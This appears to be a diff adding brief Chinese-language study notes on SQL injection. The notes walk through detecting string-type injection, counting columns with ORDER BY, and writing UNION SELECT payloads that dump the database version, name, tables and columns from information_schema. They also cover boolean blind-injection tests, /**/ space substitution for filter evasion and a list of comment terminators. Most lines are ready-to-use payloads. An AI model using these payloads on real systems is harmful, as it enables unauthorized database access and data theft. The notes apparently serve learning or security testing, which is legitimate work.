@@ -1,0 +1,24 @@
+’检测是否是字符型
+1’order by ‘猜测的显示位’，直到报错
+-1’union select 1,2,3…(根据爆出来的显示位)--+来执行
+-1’union select version(),database()…--+爆出当前数据库的版本和数据库名称
+id=-1'union select 1,group_concat(table_name) from information_schema.tables where table_schema='之前爆出的数据库名称'--+
+根据爆出的数据库爆出数据库的所有表
+
+
+id=-1'union select 1,group_concat(column_name) from information_schema.columns where table_name='表名'--+（根据爆出的表爆出所有列）
+
+
+
+盲注的时候使用逻辑真假来判断：
+1' and 1=1--+
+1' and 1=2--+
+
+空格被处理的时候可以使用/**/来进行空格的替换
+常用的注释符：
+#	Hash comment
+/*	C-style comment
+-- -	SQL comment
+;%00	Nullbyte
+`	Backtick
+
